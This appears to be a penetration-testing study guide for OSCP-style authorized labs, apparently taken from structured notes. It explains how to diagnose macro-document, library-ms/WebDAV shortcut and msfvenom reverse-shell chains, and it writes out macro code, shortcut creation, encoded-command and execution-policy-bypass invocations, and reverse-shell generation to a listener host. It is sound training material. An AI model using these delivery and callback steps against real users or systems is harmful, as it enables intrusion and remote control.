- source and hash of the original artifact or exploit;
- exact changes and payload-generation command;
- delivery path and resulting hash;
- required user/trigger action;
- os, process architecture, format and runtime assumptions;
- handler payload, bind and route;
- security-control errors/events used for diagnosis;
- verified host, identity and session type;
- listener/job/process/artifact cleanup.

remove temporary documents, shortcuts, webdav content, payloads, handler jobs and policy changes created for the authorized exercise. do not claim av evasion, user execution or a session without observed evidence.

## tooling for this section

| tool | purpose | required context | baseline | decisive output | failure cue |
| --- | --- | --- | --- | --- | --- |
| `file`/`readelf`/`ldd` | validate linux format, architecture and runtime | local artifact or target shell | section 4.1 | matching format/interpreter/libraries | existing file returns loader error |
| powershell built-ins | inspect architecture, zone, policy and logs | windows command execution; permissions vary | sections 3–7 | specific policy/status/event | missing cmdlet/log is inconclusive |
| wsgidav | conditional webdav stage for library-file exercise | installed server, permitted bind and client route | section 3.2 | options/get and explorer access | empty library or no server request |
| `msfvenom` | generate a selected payload representation | known os/arch/format/staging/route | section 8 | expected metadata and artifact | successful generation alone proves nothing on target |
| `multi/handler` | receive exact framework/staged protocol | matching payload and reachable listener | section 9 | expected session opens | connection without session implies mismatch/stage failure |
| netcat/ncat | raw listener and simple socket proof | compatible raw command shell or test connection | related shell procedure | expected peer and usable i/o | cannot stage a framework payload |
| `tcpdump`/packet capture | localize connection boundary | capture permission and correct interface | `tcpdump -ni any tcp port lport` | syn/handshake/close sequence | no packet cannot by itself identify earlier failed layer |

## sources

sections.title: 1. Preserve the execution chain
sections.search:
## 1. preserve the execution chain

```text
artifact/request
→ delivered to intended consumer
→ required user/trigger action
→ parser/interpreter/loader
→ process or bounded side effect
→ network connection
→ handler protocol
→ usable session
```

| boundary | decisive evidence | does not prove |
| --- | --- | --- |
| delivery | expected bytes, request, document or shortcut arrives intact | it was opened or parsed |
| trigger | intended user/service/parser consumed it | child process started |
| execution | harmless marker, process or command output | callback route works |
| connection | expected peer reaches listener | payload and handler agree |
| session | commands return; host and identity verified | stability or privilege |

do not replace the artifact, payload, listener and route simultaneously. record the last confirmed boundary and test the next one.

sections.title: 2. Fast diagnostic order
sections.search:
## 2. fast diagnostic order

1. reproduce a harmless direct command in the exact vulnerable or user context.
2. confirm file/request integrity, final path and consumer.
3. identify every parser, interpreter and loader.
4. match target os, process architecture, artifact format and runtime dependencies.
5. verify permissions, working directory, execution policy and application-control evidence.
6. start the correct listener/handler and prove its bind.
7. prove the target-to-listener route separately.
8. inspect concrete antimalware, application-control and process-failure evidence.
9. repair session i/o only after a connection exists.

if step 1 fails, this is not yet a payload problem. return to the exploit, input parser or execution primitive.

sections.title: 3. Client-side attacks are gated chains
sections.search:
## 3. client-side attacks are gated chains

client-side access adds two prerequisites that service exploitation does not normally have:

- the artifact must reach the intended user and application;
- the user or application must perform the action that reaches the execution sink.

before choosing a document or shortcut, establish the target os, installed application/version, delivery route, expected security zone, required interaction, target egress and callback route. a generic file that depends on absent software is not a viable attack.

### 3.1 office macro chain

use a macro-enabled format such as `.docm` or a legacy `.doc`; `.docx` does not persist embedded vba macros by itself. store the macro in the document, not only the global template. a minimal harmless execution proof is:

```vb
sub autoopen()
    runproof
end sub

sub document_open()
    runproof
end sub

sub runproof()
    createobject("wscript.shell").run _
        "cmd.exe /c whoami > %temp%\oscp-marker.txt", 0, true
end sub
```

`autoopen` and `document_open` cover distinct word opening paths. replace the proof command only after the document, trigger and execution context are confirmed.

modern office commonly blocks vba macros in files carrying mark of the web rather than offering a universal one-click enable path. relevant gates include:

- file format actually supports the macro;
- macro is stored in the delivered document;
- motw/zone identifier and security zone;
- protected view and trust center settings;
- signed publisher or trusted location decisions;
- organization gpo that the user cannot override;
- user opened the document and performed the required permitted action;
- office launched the expected child process;
- the child command survived vba, cmd and powershell quoting;
- delivery and callback network paths both work.

inspect a file's zone without changing it:

```powershell
get-item -literalpath 'c:\path\file.docm' -stream *
get-content -literalpath 'c:\path\file.docm' -stream zone.identifier
```

`zoneid=3` represents the internet zone. absence of the stream does not prove that macro policy permits execution, and removing motw does not override every policy.

### 3.2 windows library file plus shortcut

a `.library-ms` file is an xml library description that can present a remote location in explorer. the pen-200 attack pattern is two-stage:

```text
delivered .library-ms
→ user opens library
→ explorer reaches webdav location
→ user opens .lnk
→ shortcut launches chosen command
→ optional download/callback
```

if wsgidav is already installed, publish a dedicated authorized-lab directory:

```bash
mkdir -p webdav
wsgidav --host=0.0.0.0 --port=80 \
  --root=./webdav --auth=anonymous
```

> anonymous mode exposes the selected directory. bind only to the required lab interface when possible, place no sensitive files there and stop the server after the exercise.
> port 80 is the reliable baseline for a plain-http windows webdav location. use another port only after confirming the target webclient accepts that url form and the route permits it.

original library template using placeholders:

```xml
<?xml version="1.0" encoding="utf-8"?>
<librarydescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <name>@windows.storage.dll,-34582</name>
  <version>1</version>
  <islibrarypinned>true</islibrarypinned>
  <iconreference>imageres.dll,-1002</iconreference>
  <templateinfo>
    <foldertype>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</foldertype>
  </templateinfo>
  <searchconnectordescriptionlist>
    <searchconnectordescription>
      <isdefaultsavelocation>true</isdefaultsavelocation>
      <issupported>false</issupported>
      <simplelocation>
        <url>http://lhost/</url>
      </simplelocation>
    </searchconnectordescription>
  </searchconnectordescriptionlist>
</librarydescription>
```

save it with a `.library-ms` extension. windows may add a serialized location after opening it; retain a clean source copy and inspect the final artifact before delivery.

create a shortcut on a controlled windows preparation host:

```powershell
$shortcutpath = 'c:\path\webdav\action.lnk'
$shell = new-object -comobject wscript.shell
$shortcut = $shell.createshortcut($shortcutpath)
$shortcut.targetpath = "$env:systemroot\system32\cmd.exe"
$shortcut.arguments = '/c whoami > %temp%\oscp-marker.txt'
$shortcut.workingdirectory = $env:temp
$shortcut.iconlocation = "$env:systemroot\system32\imageres.dll,11"
$shortcut.save()
```

only after the harmless marker works, substitute a command compatible with the target and the separately proven callback route. diagnose this chain at three independent network points:

```text
explorer → webdav
shortcut command → optional payload/download server
executed payload → listener/handler
```

failure cues:

| observation | next boundary |
| --- | --- |
| library opens empty | webdav bind, reachability, webclient/policy, modified library serialization |
| webdav receives nothing | artifact not opened, url/port wrong, client route or webdav blocked |
| directory appears; shortcut never runs | required second user action absent or shortcut blocked |
| marker works; download absent | command quoting, dns and payload-server route |
| download occurs; no execution | format, permissions, policy, quarantine or dependency |
| execution proven; no callback | listener, route, payload/handler compatibility |

sections.title: 4. Match artifact to its consumer
sections.search:
## 4. match artifact to its consumer

the file extension is not the execution contract. record all of these:

```text
target os and build
target process architecture
artifact format
loader/interpreter
execution identity and integrity
working directory and path
required runtime/libraries
arguments and quoting
network direction
handler protocol
```

### 4.1 linux checks

```bash
uname -a
uname -m
file payload
readelf -h payload | sed -n '1,25p'
ldd payload
ls -l payload
findmnt -t /path/to/payload
head -n 1 script
```

common interpretations:

- `exec format error`: wrong format/architecture or invalid interpreter line;
- `permission denied`: missing execute permission, inaccessible parent directory, `noexec`, policy or identity issue;
- `no such file or directory` when the file exists: missing dynamic loader or broken shebang interpreter;
- missing shared object: runtime library mismatch;
- `^m` in a shebang: crlf line endings changed the interpreter path;
- works interactively but not through cron/service: environment, working directory, shell, identity or route differs.

### 4.2 windows checks

```powershell
get-ciminstance win32_operatingsystem |
  select-object caption,version,buildnumber,osarchitecture

[environment]::is64bitoperatingsystem
[environment]::is64bitprocess
$env:processor_architecture
get-authenticodesignature -filepath 'c:\path\payload.exe'
```

keep os architecture and consumer-process architecture separate. a 64-bit os can run a 32-bit process under wow64; injected code and dlls must match the process they enter. a normal executable is not necessarily a service executable, dll, msi or script:

| consumer | required property / common failure |
| --- | --- |
| direct process creation | compatible pe/elf/script and dependencies |
| windows service | service-compatible entry/control behavior; error 1053 may follow execution of a non-service program |
| dll loader/hijack | correct bitness, expected exports and dependency behavior |
| `msiexec` | valid msi package, not an exe renamed `.msi` |
| powershell | valid syntax, edition/runtime compatibility and applicable policy/control state |
| existing memory-corruption poc | documented architecture, space, bad characters and exit behavior |

sections.title: 5. Parser, command-line and length failures
sections.search:
## 5. parser, command-line and length failures

write the real chain:

```text
document/shortcut or http/sql/template input
→ application parser
→ vba/wscript/application runtime
→ cmd.exe /c, /bin/sh -c or powershell
→ final command/payload
```

start with a short marker at every layer. check:

- quote ownership at each layer;
- expansion of `%var%`, `$var` and powershell variables;
- metacharacters such as `&`, `|`, `<`, `>`, `;`, backticks and parentheses;
- url/json/xml/base64 decode count;
- command-line, vba-string, request-field or exploit-buffer length;
- current directory and relative paths.

powershell encoded-command preparation:

```powershell
$command = 'command'
$bytes = [text.encoding]::unicode.getbytes($command)
[convert]::tobase64string($bytes)
```

```cmd
powershell.exe -noprofile -noninteractive -encodedcommand base64_utf16le
```

`-encodedcommand` uses utf-16le. it solves some transport/quoting problems; it is not encryption and does not establish antimalware evasion.

sections.title: 6. PowerShell control layers
sections.search:
## 6. powershell control layers

do not merge these different controls:

| control | what it changes | useful evidence |
| --- | --- | --- |
| execution policy | conditions for loading/running scripts | `get-executionpolicy -list` and exact error |
| language mode | available powershell language features | `$executioncontext.sessionstate.languagemode` |
| amsi | submits supported script/content to antimalware | explicit block/error plus defender/powershell events |
| applocker/wdac | application/script allow policy | effective policy and application-control events |
| defender/other av | file, memory, behavior and network decisions | status, detection history, quarantine/events |
| permissions | file/process/service/token rights | access-denied result under named identity |

read-only checks:

```powershell
get-executionpolicy -list
$executioncontext.sessionstate.languagemode

get-mpcomputerstatus |
  select-object antivirusenabled,realtimeprotectionenabled,
    behaviormonitorenabled,ioavprotectionenabled,antivirussignatureversion

get-mpthreatdetection |
  select-object initialdetectiontime,threatid,actionsuccess,resources

get-applockerpolicy -effective -xml

get-winevent -logname 'microsoft-windows-windows defender/operational' `
  -maxevents 50 -erroraction silentlycontinue |
  select-object timecreated,id,leveldisplayname,message

get-winevent -logname 'microsoft-windows-applocker/exe and dll' `
  -maxevents 50 -erroraction silentlycontinue |
  select-object timecreated,id,message

get-winevent -logname 'microsoft-windows-applocker/msi and script' `
  -maxevents 50 -erroraction silentlycontinue |
  select-object timecreated,id,message
```

cmdlets, logs and fields vary by edition, installed modules, permissions and control product. missing output is inconclusive.

execution policy is defense in depth, not a windows security boundary. a process-scoped policy setting may change script-loading behavior when gpo does not override it:

```cmd
powershell.exe -noprofile -executionpolicy bypass -file c:\path\script.ps1
```

this does not disable amsi, application control, antimalware, permissions or network controls. do not change persistent machine/user policy merely to test a payload.

sections.title: 7. Interpret control evidence
sections.search:
## 7. interpret control evidence

| observation | most useful next action |
| --- | --- |
| transferred hash differs | repair transfer/encoding before execution |
| file arrives then vanishes | inspect quarantine/detection events and resource path |
| file remains; process creation denied | inspect applocker/wdac, permissions and parent process |
| script-loading policy error | inspect scope/precedence; use an authorized process-only invocation if applicable |
| explicit amsi/content block | treat content/control as confirmed; encoding alone is not a supported conclusion |
| process starts then exits | capture exit/error, dependency and architecture evidence |
| process remains; no connection | test target egress, lhost and listener |
| tcp handshake then close | handler/payload mismatch, stage failure, crash or control interruption |

modern protection can inspect files, scripts after decoding, process memory, behavior and network activity. therefore:

- changing a filename does not imply a new payload;
- base64 does not imply concealment from amsi;
- an in-memory technique is not automatically invisible;
- an encoder is primarily useful for transport/bad-character constraints, not guaranteed av bypass;
- a clean third-party scanner result does not prove execution on the target and may disclose a private sample.

prefer the least complex route already supported by evidence: a direct command, native interpreter, authenticated management service or simple command shell may meet the objective without a custom binary. deep shellcode development, process-injection implementation and generalized av-bypass recipes are outside this speedrun.

sections.title: 8. Generate only after selecting the context
sections.search:
## 8. generate only after selecting the context

```bash
msfvenom -l payloads | grep -e 'linux|windows' | grep -e 'x64|x86'
msfvenom --list formats
msfvenom -p payload_name --list-options
```

baseline stageless command shells:

```bash
msfvenom -p linux/x64/shell_reverse_tcp \
  lhost=lhost lport=lport \
  -f elf -o shell.elf

msfvenom -p windows/x64/shell_reverse_tcp \
  lhost=lhost lport=lport \
  -f exe -o shell.exe

file shell.elf shell.exe
sha256sum shell.elf shell.exe
```

existing reviewed poc with documented byte restrictions:

```bash
msfvenom -p payload_name \
  lhost=lhost lport=lport \
  exitfunc=thread \
  -f format -v variable \
  -b 'bad_characters' -s max_space
```

use `exitfunc` only when the exploit/consumer requires that termination behavior. never invent bad characters or size limits.

staging distinction:

```text
windows/x64/shell_reverse_tcp  single/stageless
windows/x64/shell/reverse_tcp  staged
```

a staged payload first connects and asks its handler for the larger stage. a raw netcat listener cannot supply that protocol.

sections.title: 9. multi/handler and session lifecycle
sections.search:
## 9. multi/handler and session lifecycle

matching handler:

```text
msfconsole -q
use exploit/multi/handler
set payload payload_name
set lhost lhost
set lport lport
set exitonsession false
show options
run -j
```

manage the resulting job/session deliberately:

```text
jobs -l
sessions -l
sessions -i session_id
background
sessions -k session_id
jobs -k job_id
```

`exitonsession false` keeps the handler available after a session opens. `run -j` backgrounds the handler. a session id is local to that framework instance; record the target, identity, payload and listener rather than relying on the number alone.

handler failure cues:

| output | interpretation |
| --- | --- |
| handler never binds | bad local address, occupied port or privilege issue |
| raw listener receives connection; framework does not | different port/interface or payload transport |
| handler receives connection but no session | exact payload/stager mismatch, stage blocked or crash |
| session opens then dies | parent exits, payload exit behavior, route/control or process crash |
| session opens as unexpected architecture/type | default payload or target was not explicitly selected |

sections.title: 10. Metasploit module workflow and exam boundary
sections.search:
## 10. metasploit module workflow and exam boundary

manual module inspection:

```text
search type:exploit cve:cve_id
info module_path
use module_path
show options
show advanced
show targets
show payloads
set rhosts target
set rport port
set target target_id
set payload payload_name
set lhost lhost
set lport lport
show missing
run
```

interpretation rules:

- module rank describes expected exploit stability, not target vulnerability;
- `check` is an active module operation and does not prove exploitability when unsupported or inconclusive;
- target ids, default payloads and options vary by module/version;
- automatic target selection is still an assumption to verify;
- a module's success message is weaker than a verified session, host and identity;
- `setg` persists values across modules and can silently aim later work at the wrong host; prefer local `set` unless global state is intentionally tracked.

current oscp+ restriction:

- `msfvenom` and `exploit/multi/handler` may be used against all targets, except that a meterpreter payload remains subject to the one-target limit;
- any metasploit auxiliary, exploit or post module—or meterpreter payload—locks the selection to one target, even if `check` or the attack fails;
- metasploit pivoting is prohibited;
- automatic exploitation tools are prohibited.

use manual/source-reviewed exploitation as the reusable baseline. decide on the restricted metasploit target deliberately and record that decision before using a restricted module or meterpreter.

sections.title: 11. Worked diagnostic paths
sections.search:
## 11. worked diagnostic paths

### a. document delivered, no callback

```text
observed: document exists
unknown: opened, macro permitted, child command, network route
test: motw/policy → harmless marker → child process/download → callback route
action: repair first failed gate; do not regenerate the payload first
```

### b. executable disappears after transfer

```text
observed: transfer response succeeded
test: destination listing/hash → defender detection/resource/event
interpretation: transfer success is not retention; quarantine requires evidence
action: choose a justified alternate execution form or native route, within scope
```

### c. powershell says scripts are disabled

```text
observed: explicit execution-policy error
test: get-executionpolicy -list and gpo precedence
action: use a process-scoped invocation if allowed; do not call this an amsi result
```

### d. connection reaches netcat but there is no shell

```text
observed: tcp connection
test: generated payload name
interpretation: staged payload may have reached a raw listener
action: use exact multi/handler or generate a compatible stageless command shell
```

### e. binary exists but returns “not found” on linux

```text
observed: path and file exist
test: file, readelf interpreter, ldd, shebang
interpretation: loader/interpreter dependency may be missing
action: build/choose a compatible artifact; do not change callback settings
```

### f. metasploit module reports completion, no session

```text
observed: module ran
test: exact target profile, payload, callback route, handler output and service state
interpretation: completion is not verified execution/session
action: preserve module output and diagnose the first missing state
```
